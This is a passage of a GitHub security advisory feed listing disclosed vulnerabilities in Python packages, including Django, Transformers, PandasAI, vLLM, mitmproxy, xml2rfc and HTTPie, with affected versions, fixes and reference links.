<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27351">https://nvd.nist.gov/vuln/detail/CVE-2024-27351</a></li>
<li><a href="https://docs.djangoproject.com/en/5.0/releases/security">https://docs.djangoproject.com/en/5.0/releases/security</a></li>
<li><a href="https://groups.google.com/forum/#%21forum/django-announce">https://groups.google.com/forum/#%21forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/mar/04/security-releases">https://www.djangoproject.com/weblog/2024/mar/04/security-releases</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/D2JIRXEDP4ZET5KFMAPPYSK663Q52NEX">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/D2JIRXEDP4ZET5KFMAPPYSK663Q52NEX</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SN2PLJGYSAAG5KUVIUFJYKD3BLQ4OSN6">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SN2PLJGYSAAG5KUVIUFJYKD3BLQ4OSN6</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZQJOMNRMVPCN5WMIZ7YSX5LQ7IR2NY4D">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZQJOMNRMVPCN5WMIZ7YSX5LQ7IR2NY4D</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/03/04/1">http://www.openwall.com/lists/oss-security/2024/03/04/1</a></li>
<li><a href="https://github.com/django/django/commit/072963e4c4d0b3a7a8c5412bc0c7d27d1a9c3521">https://github.com/django/django/commit/072963e4c4d0b3a7a8c5412bc0c7d27d1a9c3521</a></li>
<li><a href="https://github.com/django/django/commit/3394fc6132436eca89e997083bae9985fb7e761e">https://github.com/django/django/commit/3394fc6132436eca89e997083bae9985fb7e761e</a></li>
<li><a href="https://github.com/django/django/commit/3c9a2771cc80821e041b16eb36c1c37af5349d4a">https://github.com/django/django/commit/3c9a2771cc80821e041b16eb36c1c37af5349d4a</a></li>
<li><a href="https://github.com/advisories/GHSA-vm8q-m57g-pff3">https://github.com/advisories/GHSA-vm8q-m57g-pff3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm8q-m57g-pff3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-15T21:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django] Regular expression denial-of-service in Django]]></title>
        <id>https://github.com/advisories/GHSA-vm8q-m57g-pff3</id>
        <link href="https://github.com/advisories/GHSA-vm8q-m57g-pff3"/>
        <updated>2025-02-12T05:03:58.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27351">https://nvd.nist.gov/vuln/detail/CVE-2024-27351</a></li>
<li><a href="https://docs.djangoproject.com/en/5.0/releases/security">https://docs.djangoproject.com/en/5.0/releases/security</a></li>
<li><a href="https://groups.google.com/forum/#%21forum/django-announce">https://groups.google.com/forum/#%21forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/mar/04/security-releases">https://www.djangoproject.com/weblog/2024/mar/04/security-releases</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/D2JIRXEDP4ZET5KFMAPPYSK663Q52NEX">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/D2JIRXEDP4ZET5KFMAPPYSK663Q52NEX</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SN2PLJGYSAAG5KUVIUFJYKD3BLQ4OSN6">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SN2PLJGYSAAG5KUVIUFJYKD3BLQ4OSN6</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZQJOMNRMVPCN5WMIZ7YSX5LQ7IR2NY4D">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZQJOMNRMVPCN5WMIZ7YSX5LQ7IR2NY4D</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/03/04/1">http://www.openwall.com/lists/oss-security/2024/03/04/1</a></li>
<li><a href="https://github.com/django/django/commit/072963e4c4d0b3a7a8c5412bc0c7d27d1a9c3521">https://github.com/django/django/commit/072963e4c4d0b3a7a8c5412bc0c7d27d1a9c3521</a></li>
<li><a href="https://github.com/django/django/commit/3394fc6132436eca89e997083bae9985fb7e761e">https://github.com/django/django/commit/3394fc6132436eca89e997083bae9985fb7e761e</a></li>
<li><a href="https://github.com/django/django/commit/3c9a2771cc80821e041b16eb36c1c37af5349d4a">https://github.com/django/django/commit/3c9a2771cc80821e041b16eb36c1c37af5349d4a</a></li>
<li><a href="https://github.com/advisories/GHSA-vm8q-m57g-pff3">https://github.com/advisories/GHSA-vm8q-m57g-pff3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm8q-m57g-pff3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-15T21:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[certifi] Certifi removes GLOBALTRUST root certificate]]></title>
        <id>https://github.com/advisories/GHSA-248v-346w-9cwc</id>
        <link href="https://github.com/advisories/GHSA-248v-346w-9cwc"/>
        <updated>2025-02-13T00:44:20.000Z</updated>
        <content type="html"><![CDATA[<p>Certifi 2024.07.04 removes root certificates from "GLOBALTRUST" from the root store. These are in the process of being removed from Mozilla's trust store.</p>
<p>GLOBALTRUST's root certificates are being removed pursuant to an investigation which identified "long-running and unresolved compliance issues". Conclusions of Mozilla's investigation can be found <a href="https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI">here</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc">https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc</a></li>
<li><a href="https://github.com/certifi/python-certifi/commit/bd8153872e9c6fc98f4023df9c2deaffea2fa463">https://github.com/certifi/python-certifi/commit/bd8153872e9c6fc98f4023df9c2deaffea2fa463</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39689">https://nvd.nist.gov/vuln/detail/CVE-2024-39689</a></li>
<li><a href="https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI">https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20241206-0001">https://security.netapp.com/advisory/ntap-20241206-0001</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/certifi/PYSEC-2024-230.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/certifi/PYSEC-2024-230.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-248v-346w-9cwc">https://github.com/advisories/GHSA-248v-346w-9cwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-248v-346w-9cwc</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-05T20:06:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cryptography] Vulnerable OpenSSL included in cryptography wheels]]></title>
        <id>https://github.com/advisories/GHSA-79v4-65xg-pq4g</id>
        <link href="https://github.com/advisories/GHSA-79v4-65xg-pq4g"/>
        <updated>2025-02-12T18:20:08.000Z</updated>
        <content type="html"><![CDATA[<p>pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 42.0.0-44.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in <a href="https://openssl-library.org/news/secadv/20250211.txt">https://openssl-library.org/news/secadv/20250211.txt</a>.</p>
<p>If you are building cryptography source ("sdist") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyca/cryptography/security/advisories/GHSA-79v4-65xg-pq4g">https://github.com/pyca/cryptography/security/advisories/GHSA-79v4-65xg-pq4g</a></li>
<li><a href="https://openssl-library.org/news/secadv/20250211.txt">https://openssl-library.org/news/secadv/20250211.txt</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12797">https://nvd.nist.gov/vuln/detail/CVE-2024-12797</a></li>
<li><a href="https://github.com/openssl/openssl/commit/738d4f9fdeaad57660dcba50a619fafced3fd5e9">https://github.com/openssl/openssl/commit/738d4f9fdeaad57660dcba50a619fafced3fd5e9</a></li>
<li><a href="https://github.com/openssl/openssl/commit/798779d43494549b611233f92652f0da5328fbe7">https://github.com/openssl/openssl/commit/798779d43494549b611233f92652f0da5328fbe7</a></li>
<li><a href="https://github.com/openssl/openssl/commit/87ebd203feffcf92ad5889df92f90bb0ee10a699">https://github.com/openssl/openssl/commit/87ebd203feffcf92ad5889df92f90bb0ee10a699</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/11/3">http://www.openwall.com/lists/oss-security/2025/02/11/3</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/11/4">http://www.openwall.com/lists/oss-security/2025/02/11/4</a></li>
<li><a href="https://github.com/advisories/GHSA-79v4-65xg-pq4g">https://github.com/advisories/GHSA-79v4-65xg-pq4g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79v4-65xg-pq4g</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-11T18:06:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pandasai] PandasAI interactive prompt function Remote Code Execution (RCE)]]></title>
        <id>https://github.com/advisories/GHSA-vv2h-2w3q-3fx7</id>
        <link href="https://github.com/advisories/GHSA-vv2h-2w3q-3fx7"/>
        <updated>2025-02-11T21:41:48.000Z</updated>
        <content type="html"><![CDATA[<p>PandasAI uses an interactive prompt function that is vulnerable to prompt injection and run arbitrary Python code that can lead to Remote Code Execution (RCE) instead of the intended explanation of the natural language processing by the LLM. The security controls of PandasAI (2.4.3 and earlier) fail to distinguish between legitimate and malicious inputs, allowing the attackers to manipulate the system into executing untrusted code, leading to untrusted code execution (RCE), system compromise, or pivoting attacks on connected services.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12366">https://nvd.nist.gov/vuln/detail/CVE-2024-12366</a></li>
<li><a href="https://docs.getpanda.ai/v3/privacy-security">https://docs.getpanda.ai/v3/privacy-security</a></li>
<li><a href="https://docs.pandas-ai.com/advanced-security-agent">https://docs.pandas-ai.com/advanced-security-agent</a></li>
<li><a href="https://www.kb.cert.org/vuls/id/148244">https://www.kb.cert.org/vuls/id/148244</a></li>
<li><a href="https://github.com/advisories/GHSA-vv2h-2w3q-3fx7">https://github.com/advisories/GHSA-vv2h-2w3q-3fx7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vv2h-2w3q-3fx7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-11T15:32:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[transformers] Deserialization of Untrusted Data in Hugging Face Transformers]]></title>
        <id>https://github.com/advisories/GHSA-wrfc-pvp9-mr9g</id>
        <link href="https://github.com/advisories/GHSA-wrfc-pvp9-mr9g"/>
        <updated>2025-02-13T22:16:47.000Z</updated>
        <content type="html"><![CDATA[<p>Hugging Face Transformers MaskFormer Model Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.</p>
<p>The specific flaw exists within the parsing of model files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-25191.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-11393">https://nvd.nist.gov/vuln/detail/CVE-2024-11393</a></li>
<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-24-1514">https://www.zerodayinitiative.com/advisories/ZDI-24-1514</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/transformers/PYSEC-2024-228.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/transformers/PYSEC-2024-228.yaml</a></li>
<li><a href="https://github.com/huggingface/transformers/issues/34840">https://github.com/huggingface/transformers/issues/34840</a></li>
<li><a href="https://github.com/huggingface/transformers/pull/35296">https://github.com/huggingface/transformers/pull/35296</a></li>
<li><a href="https://github.com/advisories/GHSA-wrfc-pvp9-mr9g">https://github.com/advisories/GHSA-wrfc-pvp9-mr9g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wrfc-pvp9-mr9g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-23T03:31:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[transformers] Deserialization of Untrusted Data in Hugging Face Transformers]]></title>
        <id>https://github.com/advisories/GHSA-hxxf-235m-72v3</id>
        <link href="https://github.com/advisories/GHSA-hxxf-235m-72v3"/>
        <updated>2025-02-13T22:13:52.000Z</updated>
        <content type="html"><![CDATA[<p>Hugging Face Transformers Trax Model Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.</p>
<p>The specific flaw exists within the handling of model files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-25012.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-11394">https://nvd.nist.gov/vuln/detail/CVE-2024-11394</a></li>
<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-24-1515">https://www.zerodayinitiative.com/advisories/ZDI-24-1515</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/transformers/PYSEC-2024-229.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/transformers/PYSEC-2024-229.yaml</a></li>
<li><a href="https://github.com/huggingface/transformers/issues/34840">https://github.com/huggingface/transformers/issues/34840</a></li>
<li><a href="https://github.com/huggingface/transformers/pull/35296">https://github.com/huggingface/transformers/pull/35296</a></li>
<li><a href="https://github.com/advisories/GHSA-hxxf-235m-72v3">https://github.com/advisories/GHSA-hxxf-235m-72v3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hxxf-235m-72v3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-23T03:31:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[transformers] Deserialization of Untrusted Data in Hugging Face Transformers]]></title>
        <id>https://github.com/advisories/GHSA-qxrp-vhvm-j765</id>
        <link href="https://github.com/advisories/GHSA-qxrp-vhvm-j765"/>
        <updated>2025-02-13T22:15:59.000Z</updated>
        <content type="html"><![CDATA[<p>Hugging Face Transformers MobileViTV2 Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.</p>
<p>The specific flaw exists within the handling of configuration files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-24322.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-11392">https://nvd.nist.gov/vuln/detail/CVE-2024-11392</a></li>
<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-24-1513">https://www.zerodayinitiative.com/advisories/ZDI-24-1513</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/transformers/PYSEC-2024-227.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/transformers/PYSEC-2024-227.yaml</a></li>
<li><a href="https://github.com/huggingface/transformers/issues/34840">https://github.com/huggingface/transformers/issues/34840</a></li>
<li><a href="https://github.com/huggingface/transformers/pull/35296">https://github.com/huggingface/transformers/pull/35296</a></li>
<li><a href="https://github.com/advisories/GHSA-qxrp-vhvm-j765">https://github.com/advisories/GHSA-qxrp-vhvm-j765</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxrp-vhvm-j765</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-23T03:31:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[xml2rfc] xml2rfc has file inclusion irregularities]]></title>
        <id>https://github.com/advisories/GHSA-432c-wxpg-m4q3</id>
        <link href="https://github.com/advisories/GHSA-432c-wxpg-m4q3"/>
        <updated>2025-02-07T20:33:50.000Z</updated>
        <content type="html"><![CDATA[<p>Version <a href="https://github.com/ietf-tools/xml2rfc/blob/main/CHANGELOG.md#3120---2021-12-08">3.12.0</a> changed <code>xml2rfc</code> so that it would not access local files without the presence of its new <code>--allow-local-file-access</code> flag.
This prevented XML External Entity (XXE) injection attacks with <code>xinclude</code> and XML entity references.</p>
<p>It was discovered that <code>xml2rfc</code> does not respect <code>--allow-local-file-access</code> when a local file is specified as <code>src</code> in <code>artwork</code> or <code>sourcecode</code> elements. Furthermore, XML entity references can include any file inside the source dir and below without using the <code>--allow-local-file-access</code> flag. </p>
<p>The <code>xml2rfc &lt;= 3.26.0</code> behaviour:</p>
<table>
<thead>
<tr>
<th></th>
<th><code>xinclude</code></th>
<th>XML entity reference</th>
<th><code>artwork src=</code></th>
<th><code>sourcecode src=</code></th>
</tr>
</thead>
<tbody><tr>
<td>without <code>--allow-local-file-access</code> flag</td>
<td>No filesystem access</td>
<td>Any file in xml2rfc templates dir and below, any file in source directory and below</td>
<td>Access source directory and below</td>
<td>Access source directory and below</td>
</tr>
<tr>
<td>with <code>--allow-local-file-access</code> flag</td>
<td>Access any file on filesystem[^1]</td>
<td>Access any file on filesystem[^1]</td>
<td>Access source directory and below</td>
<td>Access source directory and below</td>
</tr>
</tbody></table>
<p>  [^1]: Access any file of the filesystem with the permissions of the user running <code>xml2rfc</code> can access.</p>
<h3 id="impact">Impact</h3>
<p>Anyone running <code>xml2rfc</code> as a service that accepts input from external users is impacted by this issue.
Specifying a file in <code>src</code> attribute in <code>artwork</code> or <code>sourcecode</code> elements will cause the contents of that file to appear in xml2rfc’s output results.
But that file has to be inside the same directory as the XML input source file.
For <code>artwork</code> and <code>sourcecode</code>, <code>xml2rfc</code> will not look above the source file directory.</p>
<h3 id="the-proposed-new-behaviour">The proposed new behaviour</h3>
<ul>
<li>Generalize file access checks.</li>
<li>Only allow access to files within src dir and below. (xml entity include can access templates dir).</li>
<li>Always allow access to <code>templates_dir</code> for XML entity includes.</li>
</ul>
<p>New behaviour:</p>
<table>
<thead>
<tr>
<th></th>
<th><code>xinclude</code></th>
<th>XML entity reference</th>
<th><code>artwork src=</code></th>
<th><code>sourcecode src=</code></th>
</tr>
</thead>
<tbody><tr>
<td>without <code>--allow-local-file-access</code> flag</td>
<td>No filesystem access</td>
<td>No filesystem access <em>(except for <code>templates_dir</code>)</em></td>
<td>No filesystem access</td>
<td>No filesystem access</td>
</tr>
<tr>
<td>with <code>--allow-local-file-access</code> flag</td>
<td>Access source directory and below</td>
<td>Access source directory and below <em>(Can access<code>templates_dir</code>).</em></td>
<td>Access source directory and below</td>
<td>Access source directory and below</td>
</tr>
</tbody></table>
<h3 id="workarounds">Workarounds</h3>
<p>Use a secure temporary directory to process un-trusted XML files, and do not reuse it for processing other XML documents.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-432c-wxpg-m4q3">https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-432c-wxpg-m4q3</a></li>
<li><a href="https://github.com/ietf-tools/xml2rfc/commit/ec98f9cb4b9a8658222117df037dda473ca3f4e4">https://github.com/ietf-tools/xml2rfc/commit/ec98f9cb4b9a8658222117df037dda473ca3f4e4</a></li>
<li><a href="https://github.com/advisories/GHSA-432c-wxpg-m4q3">https://github.com/advisories/GHSA-432c-wxpg-m4q3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-432c-wxpg-m4q3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-07T20:32:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM uses Python 3.12 built-in hash() which leads to predictable hash collisions in prefix cache]]></title>
        <id>https://github.com/advisories/GHSA-rm76-4mrf-v9r8</id>
        <link href="https://github.com/advisories/GHSA-rm76-4mrf-v9r8"/>
        <updated>2025-02-10T17:02:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Maliciously constructed prompts can lead to hash collisions, resulting in prefix cache reuse, which can interfere with subsequent responses and cause unintended behavior.</p>
<h3 id="details">Details</h3>
<p>vLLM's prefix caching makes use of Python's built-in hash() function. As of Python 3.12, the behavior of hash(None) has changed to be a predictable constant value. This makes it more feasible that someone could try exploit hash collisions.</p>
<h3 id="impact">Impact</h3>
<p>The impact of a collision would be using cache that was generated using different content. Given knowledge of prompts in use and predictable hashing behavior, someone could intentionally populate the cache using a prompt known to collide with another prompt in use. </p>
<h3 id="solution">Solution</h3>
<p>We address this problem by initializing hashes in vllm with a value that is no longer constant and predictable. It will be different each time vllm runs. This restores behavior we got in Python versions prior to 3.12.</p>
<p>Using a hashing algorithm that is less prone to collision (like sha256, for example) would be the best way to avoid the possibility of a collision. However, it would have an impact to both performance and memory footprint. Hash collisions may still occur, though they are no longer straight forward to predict.</p>
<p>To give an idea of the likelihood of a collision, for randomly generated hash values (assuming the hash generation built into Python is uniformly distributed), with a cache capacity of 50,000 messages and an average prompt length of 300, a collision will occur on average once every 1 trillion requests.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/12621">https://github.com/vllm-project/vllm/pull/12621</a></li>
<li><a href="https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7">https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7</a></li>
<li><a href="https://github.com/python/cpython/pull/99541">https://github.com/python/cpython/pull/99541</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-rm76-4mrf-v9r8">https://github.com/vllm-project/vllm/security/advisories/GHSA-rm76-4mrf-v9r8</a></li>
<li><a href="https://github.com/python/cpython/pull/99541">https://github.com/python/cpython/pull/99541</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/12621">https://github.com/vllm-project/vllm/pull/12621</a></li>
<li><a href="https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7">https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/73b35cca7f3745d07d439c197768b25d88b6ab7f">https://github.com/vllm-project/vllm/commit/73b35cca7f3745d07d439c197768b25d88b6ab7f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25183">https://nvd.nist.gov/vuln/detail/CVE-2025-25183</a></li>
<li><a href="https://github.com/advisories/GHSA-rm76-4mrf-v9r8">https://github.com/advisories/GHSA-rm76-4mrf-v9r8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rm76-4mrf-v9r8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-06T20:00:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mitmproxy] Mitmweb API Authentication Bypass Using Proxy Server]]></title>
        <id>https://github.com/advisories/GHSA-wg33-5h85-7q5p</id>
        <link href="https://github.com/advisories/GHSA-wg33-5h85-7q5p"/>
        <updated>2025-02-06T19:55:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In mitmweb 11.1.0 and below, a malicious client can use mitmweb's proxy server (bound to <code>*:8080</code> by default) to access mitmweb's internal API (bound to <code>127.0.0.1:8081</code> by default). In other words, while the client cannot access the API directly (good), they can access the API through the proxy (bad). An attacker may be able to escalate this <a href="https://en.wikipedia.org/wiki/Server-side_request_forgery">SSRF</a>-style access to remote code execution.</p>
<p>The mitmproxy and mitmdump tools are unaffected. Only mitmweb is affected. The <code>block_global</code> option, which is enabled by default, blocks connections originating from publicly-routable IP addresses in the proxy. The attacker needs to be in the same local network.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been fixed in mitmproxy 11.1.2 and above.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>We thank Stefan Grönke (@gronke) for reporting this vulnerability as part of a security audit by <a href="https://www.radicallyopensecurity.com/">Radically Open Security</a>. This audit was supported by the <a href="https://nlnet.nl/entrust/">NGI0 Entrust fund</a> established by <a href="https://nlnet.nl/">NLnet</a>.</p>
<h3 id="timeline">Timeline</h3>
<ul>
<li><strong>2025-01-14</strong>: Received initial report. </li>
<li><strong>2025-01-14</strong>: Verified report and confirmed receipt.</li>
<li><strong>2025-01-19</strong>: Shared patch with researcher.</li>
<li><strong>2025-02-04</strong>: Received final confirmation that patch is working.</li>
<li><strong>2025-02-05</strong>: Published patched release and advisory.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mitmproxy/mitmproxy/security/advisories/GHSA-wg33-5h85-7q5p">https://github.com/mitmproxy/mitmproxy/security/advisories/GHSA-wg33-5h85-7q5p</a></li>
<li><a href="https://github.com/mitmproxy/mitmproxy/commit/fa89055e196d953f11fd241e36ee37858993486a">https://github.com/mitmproxy/mitmproxy/commit/fa89055e196d953f11fd241e36ee37858993486a</a></li>
<li><a href="https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md">https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23217">https://nvd.nist.gov/vuln/detail/CVE-2025-23217</a></li>
<li><a href="https://en.wikipedia.org/wiki/Server-side_request_forgery">https://en.wikipedia.org/wiki/Server-side_request_forgery</a></li>
<li><a href="https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md#06-february-2025-mitmproxy-1112">https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md#06-february-2025-mitmproxy-1112</a></li>
<li><a href="https://github.com/advisories/GHSA-wg33-5h85-7q5p">https://github.com/advisories/GHSA-wg33-5h85-7q5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wg33-5h85-7q5p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T17:07:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[httpie] HTTPie allows attackers to eavesdrop on communications between the host and server via a man-in-the-middle attack]]></title>
        <id>https://github.com/advisories/GHSA-8r96-8889-qg2x</id>
        <link href="https://github.com/advisories/GHSA-8r96-8889-qg2x"/>
        <updated>2025-02-06T16:05:10.000Z</updated>
        <content type="html"><![CDATA[<p>Missing SSL certificate validation in HTTPie v3.2.2 allows attackers to eavesdrop on communications between the host and server via a man-in-the-middle attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48052">https://nvd.nist.gov/vuln/detail/CVE-2023-48052</a></li>
<li><a href="https://gxx777.github.io/HTTPie_3.2.2_Cryptographic_API_Misuse_Vulnerability.md">https://gxx777.github.io/HTTPie_3.2.2_Cryptographic_API_Misuse_Vulnerability.md</a></li>
<li><a href="https://github.com/httpie/cli/blob/master/httpie/client.py#L33">https://github.com/httpie/cli/blob/master/httpie/client.py#L33</a></li>
<li><a href="https://github.com/httpie/cli/blob/master/httpie/internal/update_warnings.py#L44">https://github.com/httpie/cli/blob/master/httpie/internal/update_warnings.py#L44</a></li>
